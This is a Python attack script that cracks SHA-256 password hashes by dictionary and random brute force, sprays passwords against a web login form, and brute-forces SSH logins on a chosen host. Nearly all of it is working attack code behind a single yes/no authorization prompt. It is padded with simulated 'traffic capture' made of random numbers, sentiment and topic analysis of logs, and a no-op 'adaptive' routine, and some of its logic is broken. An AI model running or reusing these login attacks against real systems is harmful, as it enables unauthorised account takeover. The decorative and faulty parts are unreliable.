#!/usr/bin/env python

"""
This script can be used to perform the following attacks:
- Dictionary Attack
- Brute-Force Attack
- Random Login Attack
- SSH Brute-Force Attack
"""

import argparse
import hashlib
import os
import random
import numpy as np
import string
import sys
import time
import requests  # Added missing import for random login attack
import paramiko  # Added missing import for SSH attack
from logging import getLogger, basicConfig, INFO, ERROR
from threading import Thread, Lock
from termcolor import colored 
from sklearn.ensemble import IsolationForest
from sklearn.preprocessing import StandardScaler
import re  # Import regular expression module for log parsing
from collections import Counter  # For counting occurrences
import spacy
from textblob import TextBlob
from gensim import corpora, models
import requests

# Setup logging
basicConfig(format='%(asctime)s - %(levelname)s - %(message)s', level=INFO)
logger = getLogger(__name__)

# Lock for thread synchronization
thread_lock = Lock()

# Initialize a dictionary to store feedback for each attack type
attack_feedback = {
    "dictionary": [],
    "brute_force": [],
    "random_login": [],
    "ssh_brute_force": []
}


# Define a dictionary to store parameters for each attack type
attack_params = {
    "dictionary": {"max_attempts": 5000, "retry_factor": 0.8},
    "brute_force": {"max_attempts": 10000, "retry_factor": 0.6},
    "random_login": {"max_attempts": 3000, "retry_factor": 0.9},
    "ssh_brute_force": {"max_attempts": 8000, "retry_factor": 0.7}
}


# Define a global variable for password found status
password_found = False
# Function to display ethical warnings and seek confirmation
def ethical_warning():
    print(colored("\nWarning: Running this script without proper authorization may be illegal.", "yellow"))
    print("This script is for educational purposes only. Use it responsibly.")
    confirmation = input("Do you have the proper authorization to perform this penetration test? (yes/no): ")
    if confirmation.lower() != 'yes':
        print("Exiting... You need proper authorization to proceed.")
        sys.exit(0)


def check_file_integrity(file_path):
    # Check file existence and access permissions
    if not os.path.isfile(file_path):
        print(colored(f"Error: File '{file_path}' not found!","red"))
        sys.exit(0)
    elif not os.access(file_path, os.R_OK):
        print(colored(f"Error: No read access to file '{file_path}'!","red"))
        sys.exit(0)
    else:
        print(colored(f"Pass File correct!: checked file integrity in '{file_path}'!","green"))


def capture_network_traffic():
    try:
        # Simulate capturing network traffic (replace this with actual captured data)
        traffic_data = [random.uniform(50, 100) for _ in range(100)]  
        return traffic_data
    except Exception as e:
        print(colored(f"Error occurred during network traffic capture: {e}", "red"))
        return None


def detect_anomalies(traffic_data):
    try:
        if traffic_data is None or len(traffic_data) == 0:
            print(colored("Invalid or empty network traffic data provided.", "yellow"))
            return []

        # Normalize data for uniform scaling
        scaler = StandardScaler()
        normalized_data = scaler.fit_transform(np.array(traffic_data).reshape(-1, 1))

        # Apply Isolation Forest for anomaly detection
        iso_forest = IsolationForest(contamination='auto')
        iso_forest.fit(normalized_data)

        # Predict anomalies (1 for normal, -1 for anomaly)
        anomalies = iso_forest.predict(normalized_data)
        anomaly_indices = [i for i, val in enumerate(anomalies) if val == -1]

        print(colored(f"Anomalies detected in network traffic: {len(anomaly_indices)} anomalies found.", "green"))
        print(colored(f"Anomaly indices: {anomaly_indices}", "blue"))
        
        return anomaly_indices
    except Exception as e:
        print(colored(f"An error occurred during anomaly detection: {e}", "red"))
        return []


# Function to provide feedback to the adaptive learning module after each attack
def provide_feedback(attack_type, success):
    attack_feedback[attack_type].append(success)


# Function to adapt attack parameters based on feedback
def adapt_attack_strategy(attack_type):
    successes = attack_feedback[attack_type]
    params = attack_params[attack_type]

    # Calculate success rate
    success_rate = sum(successes) / len(successes) if len(successes) > 0 else 0

    # Adjust attack parameters based on success rate
    if success_rate < 0.3:
        params["max_attempts"] *= params["retry_factor"]
    elif success_rate > 0.7:
        params["max_attempts"] /= params["retry_factor"]


# Function to print password found message
def print_password_found(password):
    print(colored("\nPassword found!", "green"))
    print(colored(f"Password: {password}", "green"))


# Function to print progress messages
def print_progress(progress, attack_type):
    if attack_type == "dictionary":
        print(colored(f"\nDictionary Attack Progress: {progress:.2f}%", "yellow"))
    elif attack_type == "brute_force":
        print(colored(f"\nBrute Force Attack Progress: {progress:.2f}%", "blue"))
    elif attack_type == "random_login":
        print(colored(f"\nRandom Login Attack Progress: {progress:.2f}%", "magenta"))
    elif attack_type == "ssh_brute_force":
        print(colored(f"\nSSH Brute Force Attack Progress: {progress:.2f}%", "cyan"))

# Function to print password not found message
def print_password_not_found():
    print(colored("\nPassword not found!", "red"))


def analyze_logs(log_file):
    try:
        with open(log_file, 'r') as file:
            logs = file.read()

            # Perform basic parsing - assuming logs contain text descriptions
            # Split logs into individual entries or lines for analysis
            log_entries = re.split(r'\n\s*\n', logs)

            # Tokenize logs using Spacy
            nlp = spacy.load('en_core_web_sm')
            doc = nlp(logs)

            # Sentiment analysis using TextBlob
            sentiment = TextBlob(logs).sentiment

            # Named Entity Recognition (NER)
            entities = [(entity.text, entity.label_) for entity in doc.ents]

            # Topic Modeling
            # Tokenize and prepare documents for topic modeling using Gensim
            documents = [line for line in log_entries]  # Modify as per log structure
            texts = [[word for word in document.lower().split()] for document in documents]
            dictionary = corpora.Dictionary(texts)
            corpus = [dictionary.doc2bow(text) for text in texts]
            lda_model = models.LdaModel(corpus, num_topics=3, id2word=dictionary)

            # Example: Print insights from various NLP techniques
            print("Sentiment Analysis:", sentiment)
            print("Named Entities:", entities)
            print("Topics Identified:")
            for idx, topic in lda_model.print_topics(-1):
                print(f"Topic {idx}: {topic}")

            # Return extracted insights or patterns for further analysis
            return {
                'sentiment': sentiment,
                'entities': entities,
                'topics': lda_model.show_topics()
            }

    except Exception as e:
        print(f"Error occurred during log analysis: {e}")
        return None


# Author's name creatively printed
author = "Mr O.Ntloyiya"
colored_author = colored(author, "blue", attrs=["underline", "bold"])
print(f"\nScript by: {colored_author}\n")

# Threading for performing attacks concurrently
class PasswordCracker(Thread):
    def __init__(self, password, password_hash, choice_of_char, attack_name):
        Thread.__init__(self)
        self.password = password
        self.password_hash = password_hash
        self.choice_of_char = choice_of_char
        self.attack_name = attack_name

    def run(self):
        global password_found
        try:
            generated_hash = hashlib.sha256(self.password.encode()).hexdigest()

            with thread_lock:
                if generated_hash == self.password_hash and not password_found:
                    logger.info("\nPassword found!")
                    logger.info(self.password)
                    password_found = True
                    print_password_found(self.password)  # Print password found message
                    return
        except Exception as e:
            logger.error(f"Error occurred: {e}")

def perform_dict_attack(password_hash: str) -> None:
    global password_found  
    # Capture network traffic during attack
    network_traffic = capture_network_traffic()

    # Detect anomalies in captured network traffic
    anomalies = detect_anomalies(network_traffic)

    if anomalies:
        print(colored("Anomalies detected in network traffic during the attack:", "red"))
        print(colored(f"Anomaly indices: {anomalies}", "yellow"))
        # Take appropriate action or logging for anomalies detected
    else:
        print(colored("No anomalies detected in network traffic.", "green"))

    try:
        dict_file = "Passwords.txt"
        check_file_integrity(dict_file)
        if not os.path.isfile(dict_file):
            logger.error("Dictionary file not found!")
            return
        
        with open(dict_file, errors="ignore") as dictionary_file:
            content = dictionary_file.readlines()
            disc_list = [word.strip() for word in content]
        
        progress = 0
        total_attempts = 0
        while not password_found:
            for word in disc_list:
                total_attempts += 1
                if len(password_hash) in [32, 40, 64]:
                    disc_hash = hashlib.new('sha256', word.encode('utf-8')).hexdigest()
                else:
                    logger.error("Invalid hash provided!")
                    return

                if disc_hash == password_hash:
                    time.sleep(0.5)
                    logger.info("\nPassword found!")
                    logger.info(word)
                    password_found = True
                    print_password_found(word)  # Print password found message
                    break

                progress = (total_attempts / len(disc_list)) * 100
                sys.stdout.write(f"\rDictionary Attack Progress: {progress:.2f}%")
                sys.stdout.flush()
                print_progress(progress, "dictionary")  # Print progress message

                if password_found:
                    break
        # Update the success variable based on password discovery
        success = True if password_found else False

        # Provide feedback after the attack
        provide_feedback("dictionary", success)
        # Adapt the attack strategy based on feedback
        adapt_attack_strategy("dictionary")

        print("\nGoodbye!")
        sys.exit(0)

    except PermissionError:
        logger.error("Dictionary file permission denied!")
    except Exception as e:
        logger.error(f"Error occurred: {e}")

def perform_brute_force_attack(password_hash: str, numb_of_char: int, type_of_characters: int) -> None:
    # Capture network traffic during attack
    network_traffic = capture_network_traffic()

    # Detect anomalies in captured network traffic
    anomalies = detect_anomalies(network_traffic)

    if anomalies:
        print(colored("Anomalies detected in network traffic during the attack:", "red"))
        print(colored(f"Anomaly indices: {anomalies}", "yellow"))
        # Take appropriate action or logging for anomalies detected
    else:
        print(colored("No anomalies detected in network traffic.", "green"))

    try:
        if type_of_characters == 1:
            choice_of_char = string.ascii_letters + string.digits + string.punctuation
        elif type_of_characters == 2:
            choice_of_char = string.ascii_letters
        elif type_of_characters == 3:
            choice_of_char = string.ascii_letters + string.digits
        elif type_of_characters == 4:
            choice_of_char = string.ascii_letters + string.punctuation
        elif type_of_characters == 5:
            choice_of_char = string.digits + string.punctuation
        elif type_of_characters == 6:
            choice_of_char = string.digits
        else:
            logger.error("Invalid character type provided!")
            return
        progress = 0
        total_attempts = 0
        while not password_found:
            gen_str = ''.join(random.choices(choice_of_char, k=numb_of_char))

            total_attempts += 1
            thread = PasswordCracker(gen_str, password_hash, choice_of_char, "Brute Force")
            thread.start()
            thread.join()

            progress = (total_attempts / (len(choice_of_char) ** numb_of_char)) * 100
            sys.stdout.write(f"\n\rBrute Force Attack Progress: {progress:.2f}%\n")
            sys.stdout.flush()
            print_progress(progress, "brute_force")  # Print progress message

            if password_found:
                print("\nPassword found!")
                print(gen_str)
                break
        # Update the success variable based on password discovery
        success = True if password_found else False

        # Provide feedback after the attack
        provide_feedback("brute_force", success)
        # Adapt the attack strategy based on feedback
        adapt_attack_strategy("brute_force")
        print("\nGoodbye!")
        sys.exit(0)

    except Exception as e:
        logger.error(f"Error occurred: {e}")

def perform_random_login_attack(username: str, password_list: list, url: str) -> None:
    global password_found 
    # Capture network traffic during attack
    network_traffic = capture_network_traffic()

    # Detect anomalies in captured network traffic
    anomalies = detect_anomalies(network_traffic)

    if anomalies:
        print(colored("Anomalies detected in network traffic during the attack:", "red"))
        print(colored(f"Anomaly indices: {anomalies}", "yellow"))
        # Take appropriate action or logging for anomalies detected
    else:
        print(colored("No anomalies detected in network traffic.", "green"))

    try:
        session = requests.Session()
        logger.info("\nCracking password...")

        progress = 0
        total_attempts = 0
        check_file_integrity(password_list)
        while not password_found:
            for password in password_list:
                total_attempts += 1
                response = session.post(url, data={"username": username, "password": password}, allow_redirects=False)

                if response.status_code == 302:
                    logger.info("\nPassword found!")
                    logger.info(password)
                    password_found = True
                    print_password_found(password)  # Print password found message
                    break

                progress = (total_attempts / len(password_list)) * 100
                sys.stdout.write(f"\n\rRandom Login Attack Progress: {progress:.2f}%\n")
                sys.stdout.flush()
                print_progress(progress, "random_login")  # Print progress message

                if password_found:
                    break
        # Update the success variable based on password discovery
        success = True if password_found else False

        # Provide feedback after the attack
        provide_feedback("random_login", success)

        # Adapt the attack strategy based on feedback
        adapt_attack_strategy("random_login")
        print("\nGoodbye!")
        sys.exit(0)

    except Exception as e:
        logger.error(f"Error occurred: {e}")

def perform_ssh_brute_force_attack(hostname: str, username: str, password_list: list, port: int) -> None:
    global password_found  # Add this line
    # Capture network traffic during attack
    network_traffic = capture_network_traffic()

    # Detect anomalies in captured network traffic
    anomalies = detect_anomalies(network_traffic)

    if anomalies:
        print(colored("Anomalies detected in network traffic during the attack:", "red"))
        print(colored(f"Anomaly indices: {anomalies}", "yellow"))
        # Take appropriate action or logging for anomalies detected
    else:
        print(colored("No anomalies detected in network traffic.", "green"))

    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        progress = 0
        total_attempts = 0
        while not password_found:
            check_file_integrity(password_list)
            for password in password_list:
                total_attempts += 1
                client.connect(hostname=hostname, port=port, username=username, password=password)

                if client.get_transport().is_authenticated():
                    logger.info("\nPassword found!")
                    logger.info(password)
                    client.close()
                    password_found = True
                    print_password_found(password)  # Print password found message
                    break

                progress = (total_attempts / len(password_list)) * 100
                sys.stdout.write(f"\n\rSSH Brute Force Attack Progress: {progress:.2f}%\n")
                sys.stdout.flush()
                print_progress(progress, "ssh_brute_force")  # Print progress message

                if password_found:
                    break
        # Update the success variable based on password discovery
        success = True if password_found else False

        # Provide feedback after the attack
        provide_feedback("ssh_brute_force", success)
        # Adapt the attack strategy based on feedback
        adapt_attack_strategy("ssh_brute_force")
        print("\nGoodbye!")
        sys.exit(0)

    except paramiko.AuthenticationException:
        logger.error("Authentication failed!")
    except paramiko.SSHException:
        logger.error("Unable to establish SSH connection!")
    except Exception as e:
        logger.error(f"Error occurred: {e}")
        
        
def main():
    ethical_warning()  # Display ethical warning before any attack
    parser = argparse.ArgumentParser(description="Perform different types of attacks.")
    parser.add_argument("attack_type", help="type of attack to perform", choices=["dictionary", "brute_force", "random_login", "ssh_brute_force"])
    parser.add_argument("--password_hash", help="password hash to crack")
    parser.add_argument("--numb_of_char", help="number of characters to try in brute-force attack", type=int)
    parser.add_argument("--type_of_characters", help="type of characters to try in brute-force attack", type=int)
    parser.add_argument("--username", help="username for random login attack")
    parser.add_argument("--password_list", help="file containing list of passwords for random login attack")
    parser.add_argument("--url", help="url for login page for random login attack")
    parser.add_argument("--hostname", help="hostname for ssh brute-force attack")
    parser.add_argument("--ssh_username", help="username for ssh brute-force attack")
    parser.add_argument("--ssh_password_list", help="file containing list of passwords for ssh brute-force attack")
    parser.add_argument("--ssh_port", help="port for ssh brute-force attack", type=int)

    args = parser.parse_args()

    if args.attack_type == "dictionary":
        perform_dict_attack(args.password_hash)
        analyze_logs("dictionary_logs.txt")  # Analyze log after dictionary attack
    elif args.attack_type == "brute_force":
        perform_brute_force_attack(args.password_hash, args.numb_of_char, args.type_of_characters)
        analyze_logs("brute_force_logs.txt")  # Analyze log after dictionary attack
    elif args.attack_type == "random_login":
        with open(args.password_list) as f:
            password_list = f.read().splitlines()
        perform_random_login_attack(args.username, password_list, args.url)
        analyze_logs("random_login_logs.txt")  # Analyze log after dictionary attack
    elif args.attack_type == "ssh_brute_force":
        with open(args.ssh_password_list) as f:
            password_list = f.read().splitlines()
        perform_ssh_brute_force_attack(args.hostname, args.ssh_username, password_list, args.ssh_port)
        analyze_logs("ssh_brute_force_logs.txt")  # Analyze log after dictionary attack

if __name__ == "__main__":
    main()
